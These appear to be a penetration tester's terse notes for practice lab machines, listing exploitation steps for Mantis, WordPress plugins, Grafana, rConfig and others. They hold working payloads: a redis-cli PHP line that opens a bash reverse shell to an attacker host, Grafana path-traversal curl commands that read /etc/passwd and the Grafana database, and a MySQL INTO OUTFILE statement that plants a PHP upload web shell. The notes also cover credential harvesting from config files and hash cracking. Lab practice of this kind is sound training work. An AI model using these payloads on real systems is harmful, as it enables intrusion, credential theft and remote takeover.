
#### Extplorer => Filemanager 
1. Get dora pw from .htusers.php then `hashcat -m 3200` 

#### Mantis => Bug tracker 
1. Use gobuster to find /bugtracker ; use CVE-2017-12419 
2. Pull config_inc.php to get mysql creds 
3. Log in to mantis & use CVE-2019-15715 

#### Mzeeav => File upload injection 
1. Browse around to find code that shows magic number check. 

#### Nukem => WP simple file list 
1. Run `wpscan --url http://{{TARGET_IP}} --api-token {{TOKEN}} --enumerate vp` 
2. Exploit = 48979 , look in wp-config.php for next user's creds 

#### Press => Flatpress 
1. Exploit = https://github.com/flatpressblog/flatpress/issues/152 

#### QuackerJack => rConfig 
1. Exploit = https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff 

#### Readys => WP site editor 
1. Run `wpscan --url http://{{TARGET_IP}} --api-token {{TOKEN}} --enumerate vp` 
2. Exploit = https://www.exploit-db.com/exploits/44340 on /etc/redis/redis.conf 
3. In redis-cli `set test '<?php system("echo \"bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1\" | bash"); ?>'` 

---- 


#### Fanastic => Grafana 
```
curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output grafana.db
https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
```

#### Squid => squid proxy, but mysql rev shell 
` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 



Also check for /webdav , /zm , /login 
Use curl -v to check header & version. 

